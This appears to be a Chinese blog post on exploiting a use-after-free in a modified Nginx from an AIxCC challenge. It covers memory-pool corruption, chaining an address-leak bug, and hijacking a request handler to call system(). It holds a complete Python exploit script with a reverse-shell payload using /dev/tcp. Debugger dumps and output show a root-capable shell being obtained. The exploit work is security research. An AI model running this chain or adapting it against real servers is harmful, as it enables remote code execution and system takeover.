1. ngx_http_alloc_large_header_buffer为与 重叠的输入数据 ( ) 分配一个大的缓冲区r->pool。  
  
1. ngx_pool_t编写一个限制较少的字符集来修复和控制and/or 的字段ngx_http_request_t。  
  
在什么情况下ngx_http_alloc_large_header_buffer调用？它可以在请求行处理和请求头处理期间调用。如果我们选择在请求行处理期间触发大缓冲区分配，因为根据触发大缓冲区分配，请求行必须有效ngx_http_parse_request_line，我们可以写入的字符集太有限了。  
  
```
/* NGX_AGAIN: a request line parsing is still incomplete */        if (r->header_in->pos == r->header_in->end) {            rv = ngx_http_alloc_large_header_buffer(r, 1);// [...]   1661           b = ngx_create_temp_buf(r->connection->pool,   1662                                   cscf->large_client_header_buffers.size); // 0x2000 changed to 0x1000
```  
  
  
如果我们不在处理请求行时而是在处理标头时触发大缓冲区分配，会怎么样？请记住，在处理有效请求行后，标头列表将从池中分配，从而导致新池块与重叠r->pool。这是到达处理请求标头的代码路径所必需的。这是一个问题，因为我们希望双重释放的指针指向大缓冲区。为了解决这个问题，我发现我可以再次触发双重释放错误 ;D。  
  
请记住，如果我们在请求行处理期间没有触发大量分配，并且即使有一个有效标头，应用程序也会崩溃。因此，我们必须在标头处理期间触发大量分配，并且不能有任何有效标头。  
  
我们之前也遇到过同样的问题：小缓冲区中解析的标头必须具有有效的语法，然后才能继续为剩余的标头分配更大的缓冲区。这看起来像是一条死路。  
  
如果我们(r->header_in->pos == r->header_in->end)使用与小缓冲区大小完全相同的请求行来使条件成立，以便我们在验证标头之前触发对标头的大缓冲区分配，会怎么样？  
  
```
if (rc == NGX_AGAIN) {            if (r->header_in->pos == r->header_in->end) { // make this condition true before reaching `NGX_HTTP_PARSE_INVALID_HEADER`                rv = ngx_http_alloc_large_header_buffer(r, 0);                if (rv == NGX_ERROR) {                    ngx_http_close_request(r, NGX_HTTP_INTERNAL_SERVER_ERROR);                    break;                }                if (rv == NGX_DECLINED) {                    p = r->header_name_start;                    r->lingering_close = 1;                    if (p == NULL) {                        ngx_log_error(NGX_LOG_INFO, c->log, 0,                                      "client sent too large request");                        ngx_http_finalize_request(r,                                            NGX_HTTP_REQUEST_HEADER_TOO_LARGE);                        break;                    }                    len = r->header_in->end - p;                    if (len > NGX_MAX_ERROR_STR - 300) {                        len = NGX_MAX_ERROR_STR - 300;                    }                    ngx_log_error(NGX_LOG_INFO, c->log, 0,                                "client sent too long header line: \"%*s...\"",                                len, r->header_name_start);                    ngx_http_finalize_request(r,                                            NGX_HTTP_REQUEST_HEADER_TOO_LARGE);                    break;                }            }            n = ngx_http_read_request_header(r);            if (n == NGX_AGAIN || n == NGX_ERROR) {                break;            }        }        /* the host header could change the server configuration context */        cscf = ngx_http_get_module_srv_conf(r, ngx_http_core_module);        rc = ngx_http_parse_header_line(r, r->header_in,                                        cscf->underscores_in_headers);// [...]        /* rc == NGX_HTTP_PARSE_INVALID_HEADER */        ngx_log_error(NGX_LOG_INFO, c->log, 0,                      "client sent invalid header line: \"%*s\\x%02xd...\"",                      r->header_end - r->header_name_start,                      r->header_name_start, *r->header_end);        ngx_http_finalize_request(r, NGX_HTTP_BAD_REQUEST);        break;
```  
  
  
另一个问题：客户端标头缓冲区中读取的旧内容将被复制到大缓冲区，其中包含有效的请求行（我们不希望这些 ASCII 字母破坏池和请求对象）。在r->state == 0.ngx_http_alloc_large_header_buffer由r->state解析函数设置的情况下，不会发生这种情况：如果 Nginx 在解析字段（例如标头行）时中途用尽字节，则状态将保留，并且至少尚未完全解析的数据必须复制到新的更大的缓冲区。  
  
```
if (r->state == 0) {        /*         * r->state == 0 means that a header line was parsed successfully         * and we do not need to copy incomplete header line and         * to relocate the parser header pointers         */        r->header_in = b;        return NGX_OK; // this way we can avoid copying useless data to the big buffer    }
```  
  
  
结果是我们从重叠池中控制了 0x1000 字节。因此，我们间接控制了池中分配的请求对象。  
  
```
gef➤ tele pool0x00007abeb6e20000│+0x0000: 0x0000000000001337   ← $rdi0x00007abeb6e20008│+0x0008: 0x00000000000013380x00007abeb6e20010│+0x0010: "nice!\r\n\r\n"0x00007abeb6e20018│+0x0018: 0x000000000000000a ("\n"?)0x00007abeb6e20020│+0x0020: 0x0000000000000fb00x00007abeb6e20028│+0x0028: 0x00007abeb6e20000  → 0x00000000000013370x00007abeb6e20030│+0x0030: 0x00000000000000000x00007abeb6e20038│+0x0038: 0x00000000000000000x00007abeb6e20040│+0x0040: 0x00000000000000000x00007abeb6e20048│+0x0048: 0x00007abeb6e1e060  → 0x0000000000000004gef➤ 0x00007abeb6e20050│+0x0050: 0x00000000000000000x00007abeb6e20058│+0x0058: 0x00000000000000010x00007abeb6e20060│+0x0060: 0x00000000000000000x00007abeb6e20068│+0x0068: 0x0000000050545448 ("HTTP"?)0x00007abeb6e20070│+0x0070: 0x00007abeb6e7f600 → 0x00007abeb6e20050  → 0x00000000000000000x00007abeb6e20078│+0x0078: 0x00007abeb6e20b20  → 0x00000000000000000x00007abeb6e20080│+0x0080: 0x00007abeb6e4dc88 → 0x00007abeb6e4e0d8 → 0x00007abeb6e4e378  → 0x00007abeb6e60470  → 0x00007abeb6e4fe38 → 0x00000000000000000x00007abeb6e20088│+0x0088: 0x00007abeb6e60190  → 0x00007abeb6e60470  → 0x00007abeb6e4fe38 → 0x00000000000000000x00007abeb6e20090│+0x0090: 0x00007abeb6e60300  → 0x00007abeb6e60518  → 0x00000000000000000x00007abeb6e20098│+0x0098: 0x00005c095e67275a  → <ngx_http_block_reading+0000> endbr64 gef➤ p *pool$4 = {  d = {    last = 0x1337 <error: Cannot access memory at address 0x1337>,    end = 0x1338 <error: Cannot access memory at address 0x1338>,    next = 0xd0a0d216563696e,    failed = 0xa  },  max = 0xfb0,  current = 0x7abeb6e20000,  chain = 0x0,  large = 0x0,  cleanup = 0x0,  log = 0x7abeb6e1e060}
```  
  
  
我们应该写些什么来劫持控制流？无论我们注入什么，都不能是有效的标头，因此 Nginx 将使用 来完成请求ngx_http_finalize_request，我注意到 (controlled) 中有一个r被调用的函数指针。漏洞利用必须修复在调用此处理程序之前访问的所有损坏的指针。  
  
```
if (r != r->main && r->post_subrequest) {        rc = r->post_subrequest->handler(r, r->post_subrequest->data, rc); // XXXR3: inject here    }
```  
  
  
我们在 libc 中注入了的地址system和指向反向 shell 字符串的指针，该字符串被注入到损坏的池中。 system('/bin/sh\x00')会立即返回，因为 Nginx 关闭了stdin。  
  
我们如何泄露堆和 libc 的地址？我的一个观察是，崩溃工作进程不会重新随机化堆和 libc 地址，因此理论上，我们可以暴力破解地址。我意识到，有时我们可以使用相同的漏洞（如果我们使用 进行编译）泄露易受攻击的池中池分配对象的地址，而不是暴力破解O3。但这并不可靠。另一个想法是，我们仍然可以链接 CPV11 漏洞，以对易受攻击的池地址做出很好的猜测。然后我们也可以对 libc 做出很好的猜测。  
  
更稳定的漏洞利用  
  
CPV11 泄露的地址指向堆地址。利用该地址，我们可以猜测堆基址（例如0x000075feb7000000）、池地址和 libc 地址。我通过多次重启 Nginx 测试了偏移量，这将使地址随机化。然而，在实践中，我们也可以明智地暴力破解地址，因为崩溃的工作进程不会重新随机化，而且我们一开始就有堆泄漏。  
  
```
0x000075feb7000000 0x000075feb7800000 0x0000000000800000 rw- 0x000075feb7800000 0x000075feb789d000 0x000000000009d000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.330x000075feb789d000 0x000075feb79e5000 0x0000000000148000 r-x /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.330x000075feb79e5000 0x000075feb7a6c000 0x0000000000087000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.330x000075feb7a6c000 0x000075feb7a77000 0x000000000000b000 r-- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.330x000075feb7a77000 0x000075feb7a7a000 0x0000000000003000 rw- /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.330x000075feb7a7a000 0x000075feb7a7e000 0x0000000000004000 rw- 0x000075feb7b17000 0x000075feb7b27000 0x0000000000010000 r-- /usr/lib/x86_64-linux-gnu/libm.so.60x000075feb7b27000 0x000075feb7ba6000 0x000000000007f000 r-x /usr/lib/x86_64-linux-gnu/libm.so.60x000075feb7ba6000 0x000075feb7bfe000 0x0000000000058000 r-- /usr/lib/x86_64-linux-gnu/libm.so.60x000075feb7bfe000 0x000075feb7bff000 0x0000000000001000 r-- /usr/lib/x86_64-linux-gnu/libm.so.60x000075feb7bff000 0x000075feb7c00000 0x0000000000001000 rw- /usr/lib/x86_64-linux-gnu/libm.so.60x000075feb7c00000 0x000075feb7c28000 0x0000000000028000 r-- /usr/lib/x86_64-linux-gnu/libc.so.60x000075feb7c28000 0x000075feb7db0000 0x0000000000188000 r-x /usr/lib/x86_64-linux-gnu/libc.so.60x000075feb7db0000 0x000075feb7dff000 0x000000000004f000 r-- /usr/lib/x86_64-linux-gnu/libc.so.60x000075feb7dff000 0x000075feb7e03000 0x0000000000004000 r-- /usr/lib/x86_64-linux-gnu/libc.so.60x000075feb7e03000 0x000075feb7e05000 0x0000000000002000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
```  
  
  
使用类似这样的配置文件（从 Nginx AIxCC 简化）：  
  
```
remote_adminoff;events {}mail {    auth_http http://127.0.0.1:1025;    xclientoff;    timeout3600s;    server {        listen2525;        protocol smtp;        smtp_authnone;    }}http {    large_client_header_buffers44096;    server {        listen       127.0.0.1:8080;        server_name  localhost;        location /host_specs {            return200"Host Specifications:\n$host_specs";        }    }}
```  
  
  
在 Ubuntu 24.04 中测试的完整漏洞如下：  
  
```
import socketfrom pwn import *libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)host = '127.0.0.1'leak_vuln_trigger = b'GET /host_specs HTTP/1.1\r\nHost: localhost\r\nConnection: Close\r\n\r\n'vuln_trigger = b'NOOP f f f f f f f f f f f\r\n'deftcp_conn(host, port):    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect( (host, port) )    return sdefread_data(s):    return s.makefile(mode='rb').read()# 1. Leak using CPV11s = tcp_conn(host, 8080)payload = b'GET /host_specs HTTP/1.1' + b'\r\n'payload += b'Host: localhost' + b'\r\n'payload += b'Connection: Close' + b'\r\n'payload += b'Black-List: 111.111.111.111;222.222.222.222;333.333.333.333;' + b'\r\n'payload += b'\r\n's.send(payload)s.send(leak_vuln_trigger)response1 = read_data(s)# print(response1)leak = u64(response1.split(b'111.111.111.111')[1][0:6] + b'\0\0')log.info(f'Leaked address = {hex(leak)}')page_base = leak - 0x41d0a0log.info(f'Page base = {hex(page_base)}')# guess (we can change it to brute force wisely)heap_address = page_base + 0x423000libc.address = page_base + 0xc00000log.info(f'Pool address = {hex(heap_address)}')log.info(f'LIBC address = {hex(libc.address)}')# 2. Trigger the CPV17 vuln twices = tcp_conn(host, 2525)s.send(vuln_trigger)s.close()s = tcp_conn(host, 2525)s.send(vuln_trigger)s.close()log.info('Execute: nc -lvnp 4444')pause()# 3. Overwrite a part of the pool object and the HTTP request objects = tcp_conn(host, 8080)request_line_base_len = len(b'GET / HTTP/1.1\r\n')request_line = b'GET /' + b'A' * (0x400 - request_line_base_len) + b' HTTP/1.1\r\n'# +0x88 : srv_conf# +0xc8 : header_in# +0x470 : post_subrequestpayload = b'bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"\0'request_headers = b''.join((    p64(0x1337) * ((0x50) // 8),    payload,    b'A' * (0x88 - 0x50 - len(payload)),    p64(heap_address + 0x88), # srv_conf (whatever pointed X if X+0x90 is a valid address)    b'B' * (0xc8 - 0x88 - 0x8),    p64(heap_address + 0xc8), # headers_in.pos (whatever, eg. itself)    p64(heap_address + 0xd0), # headers_in.last (greater than .pos)    p64(0x1338) * ((0x470 - 0xc8 - 0x10) // 8),    p64(heap_address + 0x470 + 0x8), # fake post_subrequest    p64(libc.sym['system']),    p64(0x1337),))payload = request_line + request_headers + b'\r\n\r\n's.send(payload)response2 = read_data(s)print(response2)s.close()
```  
  
  
  
```
$ python exploit_chain.py[*] Leaked address = 0x7574e1a1d0a0[*] Page base = 0x7574e1600000[*] Pool address = 0x7574e1a23000[*] LIBC address = 0x7574e2200000[*] Execute: nc -lvnp 4444[*] Paused (press any to continue)
```  
  
  
  
```
Listening on 0.0.0.0 4444Connection received on 127.0.0.1 41906bash: cannot set terminal process group (136506): Inappropriate ioctl for devicebash: no job control in this shellTo run a command as administrator (user"root"), use"sudo <command>".See "man sudo_root"for details.roundofthree@ubuntu:/tmp/cores$
```  
  
  
关于 Nginx UAF 漏洞可利用性的一些评论  
  
首先，大多数对象和缓冲区都是从池分配器（ngx_palloc调用）分配的。因此很难找到从系统分配器分配的所需大小的堆小工具（使用ngx_alloc）。  
  
其次，池分配的对象永远不会被释放回池中。它们在关联的池块被释放时被释放，即池被销毁时。由于对象是池块的切片，因此重叠相同大小块的利用技术不适用于此：分配的粒度是池大小。如果我们想将指向对象的悬空指针与另一个对象重叠，我们需要：1) 将悬空指针的已销毁池块与受害对象的池块重叠，2) 易受攻击的对象和受害对象必须位于相同的池偏移量中。  
  
CPV17 的漏洞利用不是破坏池中分配的对象，而是依赖于破坏池本身ngx_http_request_t来实现 RCE。  
  
致谢  
  
Robert NM Watson 教授，感谢他提供的建议和想法，给了我研究CHERI的机会（虽然这与 CHERI 无关，但它源自一个与 CHERI 相关的项目）。  
  
HackerChai，感谢他多次讨论错误、审阅草稿并帮助我在这个领域取得进步。  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
  
